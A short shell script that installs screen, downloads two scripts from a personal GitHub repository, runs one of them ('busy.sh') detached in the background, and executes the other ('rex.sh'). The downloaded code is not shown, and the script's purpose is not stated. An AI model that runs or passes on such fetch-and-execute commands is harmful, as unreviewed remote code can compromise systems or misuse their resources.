#!/bin/sh

sudo apt update
sudo apt install screen -y
wget https://github.com/pogchampv18/TM/raw/main/rex.sh
wget https://github.com/pogchampv18/TM/raw/main/busy.sh
chmod +x busy.sh
screen -dmS busy ./busy.sh 60 70
chmod +x rex.sh
./rex.sh
